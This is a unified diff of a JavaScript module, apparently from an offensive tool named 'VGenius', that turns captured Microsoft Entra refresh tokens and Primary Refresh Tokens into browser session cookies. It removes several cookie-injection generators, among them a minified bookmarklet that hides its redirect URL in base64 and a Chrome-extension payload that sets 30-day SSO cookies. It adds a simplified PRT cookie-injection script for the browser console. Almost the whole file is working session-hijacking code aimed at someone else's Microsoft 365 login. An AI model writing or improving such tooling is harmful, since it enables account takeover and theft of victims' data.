@@ -297,41 +297,31 @@ async function refreshStoredPrtCookie(userId, tenantId, refreshToken) {
   }
 }
 
-function generatePrtCookieInjectionScript(prtCookie, redirectUrl = 'https://login.microsoftonline.com/?auth=2') {
-  return `// VGenius PRT Cookie Injection
-(function() {
-  document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; path=/; secure; samesite=none";
-  console.log('[VGenius] PRT cookie injected');
-  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 1000);
-})();`;
-}
-
 /**
- * Generate full injection script with PRT + ESTSAUTH cookies
- * IMPORTANT: Does NOT include domain attribute to avoid third-party cookie blocking
+ * Build the browser-console script for the GraphSpy PRT cookie.
+ *
+ * This is the ONLY injection script the converter produces. It mirrors
+ * GraphSpy's own instruction (web/templates/primary_refresh_tokens.html):
+ * set `x-ms-RefreshTokenCredential` on the PRT's host, then reload so
+ * Entra performs SSO. The cookie is valid for about 5 minutes.
+ *
+ * @param {string} prtCookie  KDF-signed PRT JWT (prtkdf.buildPrtCookieJwt)
+ * @param {string} host       cookie host (default login.microsoftonline.com)
+ * @returns {string} JavaScript to paste into the browser console
  */
-function generateFullInjectionScript(prtCookie, accessToken, redirectUrl = 'https://www.office.com/') {
-  const parts = [
-    '// VGenius Full Token Injection Script',
-    '(function() {',
-    ' console.log(\'[VGenius] Starting injection...\');', ];
-
-  if (prtCookie) {
-    parts.push(`document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; path=/; secure; samesite=none";`);
-  }
-
-  if (accessToken) {
-    parts.push(`document.cookie = "ESTSAUTH=${accessToken}; path=/; secure; samesite=none";`);
-    parts.push(`document.cookie = "ESTSAUTHLIGHT=${accessToken}; path=/; secure; samesite=none";`);
-  }
-
-  parts.push("  console.log('[VGenius] All cookies injected');");
-  parts.push(`  setTimeout(function() { window.location.href = "${redirectUrl}"; }, 1000);`);
-  parts.push('})();');
-
-  return parts.join('\n');
+function generatePrtCookieInjectionScript(prtCookie, host) {
+  const target = host || 'login.microsoftonline.com';
+  return [
+    '// VGenius PRT Cookie Injection (GraphSpy method)',
+    '// Paste into the browser console while on https://' + target + '/',
+    '// (use a clean/incognito window so no other session interferes)',
+    '(function () {',
+    '  document.cookie = "x-ms-RefreshTokenCredential=' + prtCookie + '; domain=.' + target + '; path=/; Secure; SameSite=None";',
+    '  console.log("[VGenius] PRT cookie set - valid for about 5 minutes");',
+    '  window.location.href = "https://' + target + '/";',
+    '})();'
+  ].join('\n');
 }
-
 /**
  * Convert OAuth2 refresh token/PRT to session cookies with extended expiry
  * Enhanced: better error handling and more comprehensive cookie collection
@@ -829,48 +819,6 @@ function computeCookieExpiration(cookie) {
 }
 
 /**
- * Generate JavaScript code that attempts cookie injection via document.cookie.
- * 
- * Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com) because
- * document.cookie CANNOT set parent-domain cookies — that's a hard HTML5 spec limit.
- * 
- * For setting .microsoftonline.com cookies, use the Chrome extension approach
- * (generateExtensionData) which uses chrome.cookies.set() with proper domain
- * attributes. That is the only way to set .microsoftonline.com cookies from
- * the operator's browser.
- * 
- * This function is kept for legacy compatibility but should not be used as
- * the primary injection method.
- */
-function generateCookieInjectionScript(cookies) {
-  if (!cookies || !cookies.success || !cookies.cookies) { return ''; }
-  
-  // Convert to structured data
-  const structured = formatCookiesForInjection(cookies.cookies, cookies.accountType);
-  if (!structured.length) return '';
-  
-  let statement = '// VGenius Cookie Injection Script (legacy)\n';
-  statement += '// IMPORTANT: Must be run on https://login.microsoftonline.com\n';
-  statement += '// Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com)\n';
-  statement += '// because document.cookie CANNOT set parent-domain cookies.\n\n';
-  
-  for (const cookie of structured) {
-    if (!cookie.name || !cookie.value) continue;
-    const parts = [`${cookie.name}=${encodeURIComponent(cookie.value)}`];
-    parts.push('domain=.login.microsoftonline.com');
-    if (cookie.path) parts.push(`path=${cookie.path}`);
-    if (cookie.secure) parts.push('Secure');
-    if (cookie.sameSite) parts.push(`SameSite=${cookie.sameSite}`);
-    if (cookie.expirationDate) parts.push(`Max-Age=${Math.floor(cookie.expirationDate - Date.now() / 1000)}`);
-    statement += `document.cookie = "${parts.join('; ')}";\n`;
-  }
-  
-  const redirectUrl = determineEndpoint(cookies.templateType || 'office');
-  const redirectScript = `\n// Redirect to ${redirectUrl}\nwindow.location.href = "${redirectUrl}";`;
-  return statement + redirectScript;
-}
-
-/**
  * Process cookie conversion and save to database
  */
 async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType, userId) {
@@ -889,128 +837,8 @@ async function processCookieConversion(tokenId, accessToken, templateType, tenan
   return result;
 }
 
-/**
- * Generate extension data payload for the Chrome extension.
- * 
- * This is the PRIMARY method for cookie injection. The extension uses
- * chrome.cookies.set() which can set parent-domain cookies (.microsoftonline.com)
- * — the only way to inject SSO cookies from the operator's browser.
- * 
- * Returns a JSON-serializable object that the extension will use to call
- * chrome.cookies.set() for each cookie.
- * 
- * @param {object} cookieResult - The result from convertTokensToCookies()
- * @returns {object} Extension data with cookies, target URL, and metadata
- */
-function generateExtensionData(cookieResult) {
-  if (!cookieResult || !cookieResult.success || !cookieResult.cookies) {
-    return { success: false, error: 'No cookies to inject' };
-  }
-  
-  // Convert to structured format
-  const structured = formatCookiesForInjection(cookieResult.cookies, cookieResult.accountType);
-  if (!structured.length) {
-    return { success: false, error: 'No valid cookies found' };
-  }
-  
-  const targetUrl = determineEndpoint(cookieResult.templateType || 'office');
-  
-  // Every cookie MUST have a concrete domain + expirationDate.
-  // - domain without a leading dot = exact-host only (silently useless)
-  // - expirationDate undefined      = session cookie (dies on browser close)
-  // Both have been the cause of captures that "set" but never authenticate.
-  const nowSec = Math.floor(Date.now() / 1000);
-  const extensionCookies = structured
-    .map(c => ({
-      name: c.name,
-      value: c.value,
-      // Preserve the existing domain when present.
-      // When missing, default to .login.microsoftonline.com because that is
-      // where Microsoft sets ESTSAUTH / ESTSAUTHPERSISTENT during the auth
-      // redirect. Falling back to .microsoftonline.com for an empty domain
-      // over-scopes host-only cookies and breaks the login.microsoftonline.com
-      // redirect.
-      domain: c.domain && c.domain[0] === '.' ? c.domain : '.' + (c.domain || 'login.microsoftonline.com'),
-      path: c.path || '/',
-      secure: c.secure !== false,
-      httpOnly: c.httpOnly === true,
-      sameSite: c.sameSite || 'Lax',
-      // 30-day floor — never emit a session cookie
-      expirationDate: c.expirationDate && c.expirationDate > nowSec
-        ? Math.floor(c.expirationDate)
-        : nowSec + 30 * 24 * 60 * 60,
-    }))
-    .filter(c => c.name && c.value);
-  
-  // Generate bookmarklet script (document.cookie format)
-  const bookmarklet = generateBookmarkletScript(extensionCookies);
-
-  return {
-    success: true,
-    cookies: extensionCookies,
-    cookie_count: extensionCookies.length,
-    target_url: targetUrl,
-    account_type: cookieResult.accountType,
-    template_type: cookieResult.templateType,
-    fresh: cookieResult.fresh,
-    generated_at: new Date().toISOString(),
-    expires_in_seconds: cookieResult.expiration ? (cookieResult.expiration - Math.floor(Date.now() / 1000)) : undefined,
-    bookmarklet: bookmarklet,
-  };
-}
-
-/**
- * Generate a bookmarklet-style injection script using document.cookie.
- *
- * This format is designed to be run from the browser's address bar (as a
- * bookmarklet) or devtools console while on login.microsoftonline.com.
- *
- * Key differences from the chrome.cookies.set() extension approach:
- * - Uses document.cookie (works without extension permissions)
- * - Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com)
- *   because document.cookie CANNOT set parent-domain cookies
- * - Uses Max-Age=31536000 (1 year) for persistent cookies
- * - Does NOT set httpOnly (document.cookie can't do that, but it's
- *   not needed for SSO — the browser still sends the cookie)
- * - Redirects to login.microsoftonline.com after setting cookies
- *
- * LIMITATION: Must be run while on login.microsoftonline.com (or a subdomain).
- * The browser rejects document.cookie with a domain that doesn't match the
- * current page.
- *
- * @param {array} cookies - Array of cookie objects from formatCookiesForInjection
- * @returns {string} JavaScript bookmarklet code
- */
-function generateBookmarkletScript(cookies) {
-  if (!cookies || !cookies.length) return '';
-
-  // Build cookie objects with the correct domain for document.cookie
-  const cookieObjects = cookies.map(c => ({
-    name: c.name,
-    value: c.value,
-    // Use .login.microsoftonline.com (NOT .microsoftonline.com) because
-    // document.cookie can't set parent-domain cookies. The current page
-    // must be on login.microsoftonline.com for this to work.
-    domain: c.domain && c.domain.includes('login.microsoftonline.com')
-      ? c.domain
-      : '.login.microsoftonline.com',
-    path: c.path || '/',
-    secure: c.secure !== false,
-    sameSite: c.sameSite || 'None',
-  }));
-
-  const cookiesJson = JSON.stringify(cookieObjects);
-
-  // Generate the bookmarklet script
-  // atob('aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t') = https://login.microsoftonline.com
-  return `!function(){let e=JSON.parse(\`${cookiesJson}\`);
-for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`domain=\${o.domain};\`:""}Secure;SameSite=\${o.sameSite||'None'}\`;
-window.location.href=atob('aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t')}();`;
-}
-
 module.exports = {
   convertTokensToCookies,
-  generateCookieInjectionScript,
   processCookieConversion,
   determineEndpoint,
   determineResource,
@@ -1020,8 +848,5 @@ module.exports = {
   getStoredPrtCookie,
   refreshStoredPrtCookie,
   generatePrtCookieInjectionScript,
-  generateFullInjectionScript,
-  formatCookiesForInjection,
-  generateExtensionData,
-  generateBookmarkletScript
+  formatCookiesForInjection
 };
